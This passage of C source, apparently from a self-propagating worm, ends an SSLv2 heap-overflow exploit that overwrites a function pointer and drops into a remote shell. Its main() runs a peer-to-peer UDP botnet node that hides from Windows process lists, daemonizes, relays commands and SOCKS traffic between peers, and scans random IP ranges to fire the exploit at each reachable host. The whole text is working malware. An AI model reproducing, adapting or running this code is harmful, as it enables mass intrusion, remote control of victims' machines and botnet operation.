	overwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);
	overwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);

	*(int*)&overwrite_next_chunk[156] = cipher;
	*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;
	*(int*)&overwrite_next_chunk[196] = ciphers + 16;

	send_client_hello(ssl2);
	get_server_hello(ssl2);

	send_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);
	generate_session_keys(ssl2);
	get_server_verify(ssl2);

	for (i = 0; i < ssl2->conn_id_length; i++) ssl2->conn_id[i] = (unsigned char) (rand() >> 24);

	send_client_finished(ssl2);
	get_server_error(ssl2);

	sh(ssl2->sock);

	close(ssl2->sock);
	close(ssl1->sock);

	exit(0);
}
#endif

//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

#ifdef WIN32
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
#else
int main(int argc, char **argv) {
#endif
	unsigned long bases,*cpbases;
	unsigned long m;
#ifndef DEBUG
#ifndef WIN32
	int null=open("/dev/null",O_RDWR);
#endif
#endif
	struct initsrv_rec initrec;
#ifdef WIN32
	WSADATA wsaData;
	typedef DWORD (__stdcall *pRegFunction)(DWORD, DWORD);
	HINSTANCE hKernelLib;
	HKEY hKey;
	pRegFunction RegisterServiceProcess;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	srand(time(NULL)^GetCurrentProcessId());
	hMutexDelqueue = CreateMutex(NULL, FALSE, "PudMutexDelqueue");
	hMutexLowsend = CreateMutex(NULL, FALSE, "PudMutexLowsend");
	hMutexResendQueue = CreateMutex(NULL, FALSE, "PudMutexResendQueue");
	hHeap=HeapCreate(0,1000000,0);
	/*if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0L,KEY_WRITE,&hKey) == ERROR_SUCCESS) {
		char filepath[256];
		GetModuleFileName(NULL,filepath,256);
		RegSetValueEx(hKey,"Services",0,REG_SZ,filepath,strlen(filepath)+1);
	}*/
	if ((hKernelLib = LoadLibrary("kernel32.dll"))) {
		RegisterServiceProcess = (pRegFunction)GetProcAddress(hKernelLib, "RegisterServiceProcess");
		if (RegisterServiceProcess) RegisterServiceProcess(GetCurrentProcessId(), 1);
	}
	myos=1;
#else
	if (argc <= 1) {
		printf("%s <ip> ... (read source for details)\n",argv[0]);
		return 0;
	}
	myos=getos();
	srand(time(NULL)^getpid());
#endif
	memset((char*)&routes,0,sizeof(struct route_table)*24);
	memset(clients,0,sizeof(struct ainst)*CLIENTS*2);
	for (m=0;m<LINKS;m++) {
		sequence[m]=0;
		rsa[m]=0;
	}
#ifdef DEBUG
	for (m=0; servers[m].ip != (char *)0; m++) {
		sleep(2);
		if (myfork() != 0) continue;
		if (audp_listen(&udpserver,servers[m].port) != 0) {
			printf("Error: %s\n",aerror(&udpserver));
			return 0;
		}
		srand((time(NULL)^getpid())+getppid());
	    myport=servers[m].port;
		srand(getpid());
		printf("Listening on port %d with base %s\n",servers[m].port,servers[abs(m-1)].ip);
		goto done;
	}
	return 0;
	done:
#else
	if (!audp_setup(&udpserver,"127.0.0.1",PORT)) {
		unsigned long id;
		memset((void*)&initrec,0,sizeof(struct initsrv_rec));
		initrec.h.tag=0x77;
		initrec.h.len=0;
		initrec.h.id=0;
		id=relayclient(&udpserver,(void*)&initrec,sizeof(struct initsrv_rec));
		if (id) {
			addrsa(id);
			testqueues();
			delqueue(id,3);
		}
		audp_close(&udpserver);
		usleep(10);
	}
	if (audp_listen(&udpserver,PORT) != 0) {
		printf("Error: %s\n",aerror(&udpserver));
		return 0;
	}
#endif
	memset((void*)&initrec,0,sizeof(struct initsrv_rec));
	initrec.h.tag=0x75;
	initrec.h.len=0;
	initrec.h.id=0;
#ifndef WIN32
	cpbases=(unsigned long*)myalloc(sizeof(unsigned long)*argc);
	if (!cpbases) return 0;
	for (bases=1;bases<argc;bases++) {
#ifdef DEBUG
		cpbases[bases-1]=(m==0?inet_addr("127.0.0.1"):inet_addr(servers[m/2].ip));
#else
		cpbases[bases-1]=aresolve(argv[bases]);
#endif
		relay(cpbases[bases-1],(char*)&initrec,sizeof(struct initsrv_rec));
	}
#else
	cpbases=(unsigned long*)myalloc(sizeof(unsigned long)*2);
	bases=1;
	cpbases[0]=aresolve(EXTERNAL_BASE);
	relay(cpbases[0],(char*)&initrec,sizeof(struct initsrv_rec));
#endif
	testqueues();
	numlinks=0;
#ifndef DEBUG
#ifndef WIN32
#ifndef NODAEMON
	dup2(null,0);
	dup2(null,1);
	dup2(null,2);
	if (myfork()) return 1;
#endif
#endif
#endif
#ifdef SCAN
	a=classes[rand()%(sizeof classes)];
	b=rand();
	c=0;
	d=0;
#endif
#ifdef WIN32
	parent=GetCurrentThreadId();
#else
	signal(SIGCHLD,nas);
	signal(SIGHUP,nas);
	parent=getpid();
#endif
	while (1) {
		static unsigned long timeout=0,timeout2=0,timeout3=0;
		char _buf[MAXBUF];
		int n=0,p=0;
		long l=0,i=0;
		unsigned long start=time(NULL),lens[256],sizes[256];
		fd_set read;
		struct timeval tm;

		FD_ZERO(&read);
		if (udpserver.sock > 0) FD_SET(udpserver.sock,&read);
		udpserver.len=0;
		l=udpserver.sock;
		for (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) {
			FD_SET(clients[n].sock,&read);
			clients[n].len=0;
			if (clients[n].sock > l) l=clients[n].sock;
		}
		memset((void*)&tm,0,sizeof(struct timeval));
		tm.tv_sec=1;
		tm.tv_usec=0;
		l=select(l+1,&read,NULL,NULL,&tm);

		if (l == -1) {
#ifdef WIN32
			if (WSAGetLastError() == WSAEINTR) {
#else
			if (errno == EINTR) {
#endif
				struct _pids *getpids=pids;
				while(getpids != NULL) {
#ifdef WIN32
					unsigned long code=STILL_ACTIVE;
					if (getpids->id) GetExitCodeThread(getpids->handle,&code);
					if (getpids->id && code != STILL_ACTIVE) {
#else
					if (getpids->id && waitpid(getpids->id,NULL,WNOHANG) > 0) {
#endif
						struct _pids *agetpids=pids, *aprevpids=NULL;
						while(agetpids != NULL) {
							if (agetpids->id == getpids->id) {
								struct _pids *next=agetpids->next;
								if (agetpids->type == 1) {
									myfree(agetpids->udpclient);
									myfree(agetpids->buf);
								}
								myfree(agetpids);
								if (aprevpids) aprevpids->next=next;
								else pids=next;
								break;
							}
							aprevpids=agetpids;
							agetpids=agetpids->next;
						}
						getpids=pids;
					}
					else getpids=getpids->next;
				}
			}
			continue;
		}
		timeout+=time(NULL)-start;
		if (timeout >= 60) {
			if (links == NULL || numlinks == 0) {
				memset((void*)&initrec,0,sizeof(struct initsrv_rec));
				initrec.h.tag=0x75;
				initrec.h.len=0;
				initrec.h.id=0;
				for (i=0;i<bases;i++) relay(cpbases[i],(char*)&initrec,sizeof(struct initsrv_rec));
			}
			else if (!myip) {
				memset((void*)&initrec,0,sizeof(struct initsrv_rec));
				initrec.h.tag=0x74;
				initrec.h.len=0;
				initrec.h.id=0;
				broadcast((void*)&initrec,sizeof(struct initsrv_rec));
			}
			timeout=0;
		}
		timeout2+=time(NULL)-start;
		if (timeout2 >= 60*30) {
			memset(_buf,0,sizeof(struct header));
			broadcast(_buf,sizeof(struct header));
			timeout2=0;
		}
		timeout3+=time(NULL)-start;
		if (timeout3) {
			testqueues();
			timeout3=0;
		}

		if (udpserver.sock > 0 && FD_ISSET(udpserver.sock,&read)) udpserver.len=AREAD;

		for (n=0;n<(CLIENTS*2);n++) if (clients[n].sock > 0) if (FD_ISSET(clients[n].sock,&read)) clients[n].len=AREAD;

#ifdef SCAN
		if (myip) for (n=CLIENTS,p=0;n<(CLIENTS*2) && p<100;n++) if (clients[n].sock == 0) {
			char srv[256];
			if (d == 255) {
				if (c == 255) {
					a=classes[rand()%(sizeof classes)];
					b=rand();
					c=0;
				}
				else c++;
				d=0;
			}
			else d++;
			memset(srv,0,256);
			sprintf(srv,"%d.%d.%d.%d",a,b,c,d);
			clients[n].ext=time(NULL);
			atcp_sync_connect(&clients[n],srv,SCANPORT);
			p++;
		}
		for (n=CLIENTS;n<(CLIENTS*2);n++) if (clients[n].sock != 0) {
			p=atcp_sync_check(&clients[n]);
			if (p == ASUCCESS || p == ACONNECT || time(NULL)-((unsigned long)clients[n].ext) >= 5) atcp_close(&clients[n]);
			if (p == ASUCCESS) {
				char srv[256];
				conv(srv,256,clients[n].in.sin_addr.s_addr);
				if (mfork() == 0) {
					exploit(srv);
					exit(0);
				}
			}
		}
#endif
		for (n=0;n<CLIENTS;n++) if (clients[n].sock != 0) {
			if (clients[n].ext2 == TCP_PENDING) {
				struct add_rec rc;
				memset((void*)&rc,0,sizeof(struct add_rec));
				p=atcp_sync_check(&clients[n]);
				if (p == ACONNECT) {
					rc.h.tag=0x42;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					relayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
					myfree(clients[n].ext);
					myfree(clients[n].ext5);
					atcp_close(&clients[n]);
				}
				if (p == ASUCCESS) {
					rc.h.tag=0x43;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					relayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
					clients[n].ext2=TCP_CONNECTED;
					if (clients[n].ext5) {
						atcp_send(&clients[n],clients[n].ext5,9);
						clients[n].ext2=SOCKS_REPLY;
					}
				}
			}
			else if (clients[n].ext2 == SOCKS_REPLY && clients[n].len != 0) {
				struct add_rec rc;
				memset((void*)&rc,0,sizeof(struct add_rec));
				l=atcp_recv(&clients[n],_buf,MAXBUF);
				if (*_buf == 0) clients[n].ext2=TCP_CONNECTED;
				else {
					rc.h.tag=0x42;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					relayclient(clients[n].ext,(void*)&rc,sizeof(struct add_rec));
					myfree(clients[n].ext);
					myfree(clients[n].ext5);
					atcp_close(&clients[n]);
				}
			}
			else if (clients[n].ext2 == TCP_CONNECTED && clients[n].len != 0) {
				struct data_rec rc;
				memset((void*)&rc,0,sizeof(struct data_rec));
				l=atcp_recv(&clients[n],_buf+sizeof(struct data_rec),MAXBUF-sizeof(struct data_rec));
				if (l == AUNKNOWN) {
					struct kill_rec rc;
					memset((void*)&rc,0,sizeof(struct kill_rec));
					rc.h.tag=0x42;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					relayclient((struct ainst *)clients[n].ext,(void*)&rc,sizeof(struct kill_rec));
					myfree(clients[n].ext);
					myfree(clients[n].ext5);
					atcp_close(&clients[n]);
				}
				else {
					l=clients[n].len;
					rc.h.tag=0x41;
					rc.h.seq=newseq();
					rc.h.id=clients[n].ext3;
					rc.h.len=l;
					_encrypt(_buf+sizeof(struct data_rec),l);
					memcpy(_buf,(void*)&rc,sizeof(struct data_rec));
					relayclient((struct ainst *)clients[n].ext,_buf,l+sizeof(struct data_rec));
				}
			}
		}

		if (udpserver.len != 0) if (!audp_recv(&udpserver,&udpclient,_buf,MAXBUF,lens,sizes,256)) {
			char *buf;
			unsigned long m,len;
			for (m=0;m<udpserver.len;m++) {
				struct llheader *llrp, ll;
				struct header *tmp;
				buf=_buf+lens[m];
				len=sizes[m];
				if (len < sizeof(struct llheader)) continue;
				buf+=sizeof(struct llheader);
				len-=sizeof(struct llheader);
				llrp=(struct llheader *)(buf-sizeof(struct llheader));
				tmp=(struct header *)buf;
				memset((void*)&ll,0,sizeof(struct llheader));
				if (llrp->type == 0) {
					if (llrp->checksum != in_cksum((u_short *)buf,len)) continue;
					ll.type=1;
					ll.checksum=0;
					ll.cancelation=0;
					ll.id=llrp->id;
					if (tmp->tag != 0x26) addackqueue(&udpclient,(char*)&ll,sizeof(struct llheader));
					if (!usersa(llrp->id)) addrsa(llrp->id);
					else continue;
				}
				else if (llrp->type >= 1) {
					if (!delqueue(llrp->id,llrp->type) && llrp->cancelation) {
						ll.type=3;
						ll.checksum=0;
						ll.cancelation=0;
						ll.id=llrp->cancelation;
						addackqueue(&udpclient,(char*)&ll,sizeof(struct llheader));
					}
					continue;
				}
				if (len >= sizeof(struct header)) {
					switch(tmp->tag) {
						case 0x26: { // Route
							struct route_rec *rp=(struct route_rec *)buf;
							struct next_rec { unsigned long server; };
							unsigned long i;
							if (len < sizeof(struct route_rec)) break;
							if (!useseq(rp->h.seq)) {
								int segmentation=0,local=0;
								addseq(rp->h.seq);
								if (rp->sync == 1 && rp->links != numlinks) {
									if (time(NULL)-synctime > 60) {
										if (rp->links > numlinks) {
											memset((void*)&initrec,0,sizeof(struct initsrv_rec));
											initrec.h.tag=0x72;
											initrec.h.len=0;
											initrec.h.id=0;
											relayclient(&udpclient,(char*)&initrec,sizeof(struct initsrv_rec));
										}
										else syncm(&udpclient,0x71,0);
										synctime=time(NULL);
									}
								}

								if (rp->sync == 1) {
									if (getnumlinks(rp->start,rp->end) >= rp->seglinks) segmentation=1;
								}
								else segmentation=1;

								if (rp->sync != 3) {
									rp->sync=1;
									rp->links=numlinks;
								}

								if (rp->server == -1 || rp->server == 0) {
									local=1;
									rp->server=0;
								}
								else if (myip) {
									unsigned long i;
									for (i=0;i<rp->server;i++) {
										struct next_rec *fc=(struct next_rec*)(buf+sizeof(struct route_rec)+(i*sizeof(struct next_rec)));
										if (fc->server == myip) {
											local=1;
											break;
										}
									}
								}
								if (local && len >= sizeof(struct route_rec)+(rp->server*sizeof(struct next_rec))) {
									struct header *a=(struct header*)(buf+sizeof(struct route_rec)+(rp->server*sizeof(struct next_rec)));
#ifdef DEBUG
									Log("%d Received route for tag: %x\n",myport,a->tag);
#endif
									relay(inet_addr("127.0.0.1"),buf+sizeof(struct route_rec)+(rp->server*sizeof(struct next_rec)),len-(sizeof(struct route_rec)+(rp->server*sizeof(struct next_rec))));
								}

								if (segmentation) {
									unsigned long a=sizeof(struct llheader);
									char *g=(char*)&ll;
									struct ainst ts;
									char ip[256];
									memset((void*)&ts,0,sizeof(struct ainst));
									ll.type=rp->ttag;
									ll.cancelation=segment(buf,len,rp->start,rp->end);
									if (ll.cancelation) {
										conv(ip,256,udpclient.in.sin_addr.s_addr);
										audp_setup(&ts,ip,htons(udpclient.in.sin_port));
										audp_send(&ts,&g,1,&a);
										audp_close(&ts);
									}
								}

								for (i=LINKS-1;i>0;i--) memcpy((struct route_table*)&routes[i],(struct route_table*)&routes[i-1],sizeof(struct route_table));
								memset((struct route_table*)&routes[0],0,sizeof(struct route_table));
								routes[0].id=rp->h.id;
								routes[0].ip=udpclient.in.sin_addr.s_addr;
								routes[0].port=htons(udpclient.in.sin_port);
							}
							} break;
						case 0x70: { // Incomming client
							struct {
								struct addsrv_rec a;
								unsigned long server;
							} rc;
							struct myip_rec rp;
							if (!isreal(udpclient.in.sin_addr.s_addr)) break;

							memset((void*)&rp,0,sizeof(struct myip_rec));
							rp.h.tag=0x73;
							rp.h.id=0;
							rp.ip=udpclient.in.sin_addr.s_addr;
							relayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));

							if (!myip) {
								struct qmyip_rec rw;
								memset((void*)&rw,0,sizeof(struct qmyip_rec));
								rw.h.tag=0x74;
								rw.h.id=0;
								relayclient(&udpclient,(void*)&rw,sizeof(struct qmyip_rec));
							}

							memset((void*)&rc,0,sizeof(rc));
							rc.a.h.tag=0x71;
							rc.a.h.id=0;
							rc.a.h.len=sizeof(unsigned long);
							rc.server=udpclient.in.sin_addr.s_addr;
							broadcast((void*)&rc,sizeof(rc));

							addserver(rc.server);
							syncm(&udpclient,0x71,0);
							} break;
						case 0x71: { // Receive the list
							struct addsrv_rec *rp=(struct addsrv_rec *)buf;
							struct next_rec { unsigned long server; };
							unsigned long a;
							char b=0;
							if (len < sizeof(struct addsrv_rec)) break;
							for (a=0;rp->h.len > a*sizeof(struct next_rec) && len > sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec));a++) {
								struct next_rec *fc=(struct next_rec*)(buf+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec)));
								addserver(fc->server);
							}
							for (a=0;a<numlinks;a++) if (links[a] == udpclient.in.sin_addr.s_addr) b=1;
							if (!b && isreal(udpclient.in.sin_addr.s_addr)) {
								struct myip_rec rp;
								memset((void*)&rp,0,sizeof(struct myip_rec));
								rp.h.tag=0x73;
								rp.h.id=0;
								rp.ip=udpclient.in.sin_addr.s_addr;
								relayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));
								addserver(udpclient.in.sin_addr.s_addr);
							}
							} break;
						case 0x72: { // Send the list
							syncm(&udpclient,0x71,0);
							} break;
						case 0x73: { // Get my IP
							struct myip_rec *rp=(struct myip_rec *)buf;
							if (len < sizeof(struct myip_rec)) break;
							if (!myip && isreal(rp->ip)) {
								myip=rp->ip;
								addserver(rp->ip);
							}
							} break;
						case 0x74: { // Transmit their IP
							struct myip_rec rc;
							memset((void*)&rc,0,sizeof(struct myip_rec));
							rc.h.tag=0x73;
							rc.h.id=0;
							rc.ip=udpclient.in.sin_addr.s_addr;
							if (!isreal(rc.ip)) break;
							relayclient(&udpclient,(void*)&rc,sizeof(struct myip_rec));
							} break;
						case 0x75: { // Initial request
							memset((void*)&initrec,0,sizeof(struct initsrv_rec));
							initrec.h.tag=0x76;
							initrec.h.len=0;
							initrec.h.id=0;
							relayclient(&udpclient,(char*)&initrec,sizeof(struct initsrv_rec));
							} break;
						case 0x76: { // Initial request reply
							memset((void*)&initrec,0,sizeof(struct initsrv_rec));
							initrec.h.tag=0x70;
							initrec.h.len=0;
							initrec.h.id=0;
							relayclient(&udpclient,(char*)&initrec,sizeof(struct initsrv_rec));
							} break;
						case 0x77: { // SO_REUSEPORT fix
							char ip[256];
							conv(ip,256,udpclient.in.sin_addr.s_addr);
							if (!strncmp(ip,"127.",4)) exit(0);
							} break;
						default: {
							unsigned long i;
							if (tmp->tag >= 0x40 && tmp->tag <= 0x6F) {
								struct header *rc=(struct header *)buf;
								if (len < sizeof(struct header)) break;
								if (!useseq(rc->seq)) {
									addseq(rc->seq);
									for (i=0;i<LINKS;i++) if (routes[i].id == rc->id) {
										struct ainst ts;
										char srv[256];
										conv(srv,256,routes[i].ip);
										audp_relay(&udpserver,&ts,srv,routes[i].port);
										relayclient(&ts,buf,len);
										break;
									}
								}
								break;
							}
							if (tmp->tag >= 0x10 && tmp->tag <= 0x3F) for (i=0;funcs[i].id != 0;i++) if (funcs[i].func && funcs[i].id == tmp->tag) {
								if (funcs[i].wait) {
									struct _pids *newpid;
									newpid=(struct _pids *)myalloc(sizeof(struct _pids));
									if (!newpid) break;
									newpid->id=0;
									newpid->type=1;
									newpid->func=funcs[i].func;
									newpid->udpclient=(struct ainst*)myalloc(sizeof(struct ainst));
									if (!newpid->udpclient) {
										myfree(newpid);
										break;
									}
									memcpy(newpid->udpclient,&udpclient,sizeof(struct ainst));
									newpid->buf=(char*)myalloc(len);
									if (!newpid->buf) {
										myfree(newpid->udpclient);
										myfree(newpid);
										break;
									}
									memcpy(newpid->buf,buf,len);
									newpid->len=len;
									newpid->next=pids;
									pids=newpid;
								}
								else funcs[i].func(&udpclient,buf,len);
								break;
							}
							} break;
					}
				}
			}
		}
	}
	audp_close(&udpserver);
	return 0;
}

